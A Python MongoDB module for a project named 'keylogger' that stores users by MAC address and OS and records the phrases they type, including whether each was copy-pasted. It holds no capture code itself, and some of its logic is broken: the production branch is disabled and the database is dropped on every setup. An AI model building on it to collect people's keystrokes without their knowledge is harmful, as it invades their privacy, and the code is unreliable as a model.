import os
from pymongo import MongoClient
from utils import database as get_db
from server import logger

db = None

def setup_database():
    global db

    MONGO_URL = get_db.get_database_credentials()
    if MONGO_URL and False:
        # Heroku
        client = MongoClient(MONGO_URL)
    else:
        # Local (Development)
        client = MongoClient()
        client.drop_database('keylogger')
        logger.info("* Using LOCAL database")

    db = client['keylogger']


def get_user_id(user):
    return db.users.find({"mac":user["mac"]})


def get_users_by_os(os):
    return db.users.find({"os": os})


def get_copied_phrases(n=100):
    pipeline = [
        {"$match": {"copy_pastaed": True}},
        {"$group": {"_id":"$phrase", "num": {"$sum":1}}},
        {"$limit": int(n)},
        {"$project": {"_id": 0, "phrase": "$_id", "num_occurences":"$num"}}
    ]
    return db.phrases.aggregate(pipeline)


def get_or_create_user(user):
    user_dict = user.__dict__
    user_obj = db.users.find_one(user_dict)
    if user_obj is None:
        db.users.insert_one(user_dict)
    return user


def insert_phrases(user, phrases_list):
    for p in phrases_list:
        user_id = get_user_id(user.__dict__)
        if user_id is None:
            logger.error("insert_phrases: Bad user id")
        phrase = p.__dict__
        phrase['user_id'] = str(user_id)
        db.phrases.insert_one(phrase)


def update_user(user):
    db.users.update({"mac": user.mac}, {"$set": user}, upsert=False)
